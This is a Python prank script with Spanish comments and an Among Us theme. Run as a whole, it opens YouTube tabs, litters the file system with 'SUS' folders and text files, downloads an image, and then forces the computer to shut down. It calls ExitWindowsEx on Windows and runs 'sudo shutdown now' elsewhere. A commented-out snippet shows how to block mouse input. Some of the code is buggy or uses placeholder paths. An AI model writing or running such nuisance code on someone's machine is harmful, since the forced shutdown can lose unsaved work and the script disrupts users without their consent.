from multiprocessing import pool
import shutil
import subprocess
from multiprocessing.pool import ThreadPool
import pathlib
import os
import webbrowser
import requests
import sys
import ctypes

'''
from ctypes import windll
esto bloquea el mouse pero solo en Windows
ok = windll.user32.BlockInput(True) 
'''
pool = ThreadPool()
max = 1 #Maximo de carpetas, archivos e imagenes para crear/descargar

#Con esta funcion apaga la computadora
def apagar():
    if sys.platform == "win32":
        user32 = ctypes.WinDLL('user32')
        user32.ExitWindowsEx(0x00000008, 0x00000000)
    else:
        os.system('sudo shutdown now')

#funcion que crea las carpetas y dentro de ellas archivos
def crear_carpeta(ruta):
    for i in range(0, max):
        direc = os.mkdir(str(ruta)+f"/SUS{str(i)}")
        archivo = open(str(ruta)+f"/SUS{str(i)}"+f"/SUS{str(i)}.txt", "w")
        archivo = open(str(ruta)+f"/SUS{str(i)}"+f"/SUS{str(i)}.txt", "a")
        archivo.write("SUS "*1000)
    return direc

def popen_dir(ruta):
    for i in range(0, max):
        cmd = subprocess.Popen(crear_carpeta(
            ruta)+str(i), shell=True, stdout=subprocess.PIPE)
        output, error = cmd.communicate()
    return output

def crear_carpeta_ruta():
    # Estas son las rutas donde se crearan las carpetas y archivos
    for i in pool.map(crear_carpeta, [pathlib.Path().absolute(), "/otra/ruta"]):
        pass

def descargar_imagen():
    for i in range(0, max):
        imagen_url = "https://cdn.pixabay.com/photo/2021/02/12/13/43/among-us-6008615_960_720.png"
        nombre = imagen_url.split("/")[-1]
        r = requests.get(imagen_url, stream=True)
        if r.status_code == 200:
            r.raw.decode_content = True
            with open(str(i)+nombre, 'wb') as f:
                shutil.copyfileobj(r.raw, f)

def abrir_nav():
    webbrowser.open_new_tab(
        "https://www.youtube.com/watch?v=0bZ0hkiIKt0")
    try:
        webbrowser.get("chrome").open_new(
            "https://www.youtube.com/watch?v=0bZ0hkiIKt0")
    except webbrowser.Error:
        pass

def main():
    abrir_nav()
    crear_carpeta_ruta()
    descargar_imagen()
    apagar()

if __name__ == "__main__":
    main()
